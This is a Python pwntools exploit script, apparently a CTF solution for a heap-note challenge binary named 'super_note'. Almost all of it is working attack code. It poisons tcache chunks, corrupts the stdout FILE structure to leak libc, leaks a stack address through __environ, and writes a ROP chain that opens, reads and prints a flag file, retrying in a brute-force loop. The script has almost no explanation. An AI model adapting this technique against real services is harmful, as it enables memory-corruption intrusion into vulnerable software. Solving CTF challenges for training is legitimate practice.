# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
import galatea 
context.update( os = 'linux',timeout = 1)
context.log_level = 'debug' 
binary = 'super_note'
elf = ELF('super_note')
libc = elf.libc
context.binary = binary
DEBUG = 1
if DEBUG:
  p = process(binary)
  #p = process(['qemu-aarch64','-L','',binary])
  #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
  host = ''
  port = ""
  p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
  gdb.attach(p)
  pause()

def cmd(num):
  sla("choice:",num)

def add(id,size):
  cmd(1)
  sla(":",id)
  sla(":",size)

def edit(id,context="aaa"):
  cmd(2)
  sla(":",id)
  sa(":",context)

def show(id):
  cmd(3)
  sla(":",id)


def delete(id):
  cmd(4)
  sla(":",id)

def to_pwn():

  add(0,0x50)
  add(1,0x50)

  show(0)

  p.recvuntil("address:[")
  low_addr = rint('0x1080') - 0x18b0

  lg("low_addr",low_addr)

  delete(0)
  delete(1)

  edit(1,p16(low_addr))
  #0x8910
  #0x7000
  #0x18b0

  add(0,0x50)
  add(1,0x50)

  edit(1,p64(0)*9 + p64(0x0007000700070007))
  delete(1)

  add(2,0x40) 
  add(3,0x40) 
  add(4,0x40) 

  delete(2)
  delete(3)

  edit(3,"\xb0") #链到4

  edit(4,p16(0xd6a0))

  add(5,0x40)
  add(6,0x40)

  edit(1,p64(0x0001000100010001)+p64(0x0))
  payload = p64(0xfbad1800) + p64(0)*3 + "\x00"

  add(7,0x40)
  edit(7,payload)
  p.recv(8)
  leak = l64()
  if leak == 0:
    raise EOFError
  lg("leak",leak)
  #stdout 0xd6a0
  offset = 0x7f563057d6a0 - 0x7f563057c980
  _IO_2_1_stdout_ = leak + offset
  libc_base = _IO_2_1_stdout_ -libc.sym["_IO_2_1_stdout_"]
  environ = libc_base + libc.sym['__environ']
  lg("environ",environ)

  payload = p64(0xfbad1800) + p64(0)*3 + p64(environ-0x10) +p64(environ+0x10)
  edit(7,payload)
  stack_addr = l64() - 0x120
  lg("stack_addr",stack_addr)

  add(8,0x60)
  delete(8)
  edit(8,p64(stack_addr))

  add(8,0x60)
  add(9,0x60)

  read_addr = libc.sym["read"] + libc_base
  #open_addr = libc.sym["open"] + libc_base
  puts_addr = libc.sym["puts"] + libc_base
  
  ret = 0x0000000000025679 + libc_base
  syscall = 0X00000000011B70B + libc_base
  pop_rax_ret = 0x000000000004a550 + libc_base
  pop_rdi_ret = 0x0000000000026b72 + libc_base
  pop_rsi_ret = 0x0000000000027529 + libc_base
  pop_rdx_rbx_ret = 0x00000000001626d6 + libc_base
  
 
  lg("pop_rdi_ret",pop_rdi_ret)
  lg("read_addr",read_addr)

  #gdb.attach(p,"b *puts")
  #pause()
  payload =  p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(stack_addr) + p64(pop_rdx_rbx_ret) + p64(0x400) +p64(0) + p64(read_addr)
  
  edit(9,payload)
  
  payload_orw = "flag\x00".ljust(0x40,"\x00")
  
  payload_orw+= p64(pop_rax_ret) + p64(2) + p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rsi_ret) + p64(0) + p64(syscall)
  
  payload_orw+= p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(stack_addr+0x100) + p64(pop_rdx_rbx_ret)  + p64(0x100)+ p64(0x100)+p64(read_addr)
  
  payload_orw+= p64(pop_rdi_ret) + p64(stack_addr+0x100) + p64(puts_addr)
  
  #dbg()
  sla("done",payload_orw)
  
  
  p.interactive()
  

#to_pwn()

i = 0
while 1:
    i += 1
    log.warn(str(i))
    try:
        to_pwn()
    except Exception:
        p.close()
        p = process(binary)
        continue



'''
@File    :   super_note.py
@Time    :   2021/06/03 19:52:39
@Author  :   Niyah 
'''